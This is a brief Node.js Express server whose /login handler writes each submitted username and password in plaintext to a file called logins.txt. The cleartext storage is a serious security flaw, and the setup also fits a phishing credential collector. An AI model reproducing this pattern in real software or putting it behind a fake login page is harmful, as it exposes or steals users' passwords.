const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware to parse the incoming request bodies
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (HTML, CSS, etc.)
app.use(express.static('public'));

// Handle form submission
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    // Construct the text to write
    const data = `Username: ${username}, Password: ${password}\n`;

    // Append the data to a file
    fs.appendFile('logins.txt', data, (err) => {
        if (err) {
            console.error('Failed to write to file:', err);
            return res.status(500).send('Internal Server Error');
        }
        res.send('Login details saved successfully!');
    });
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
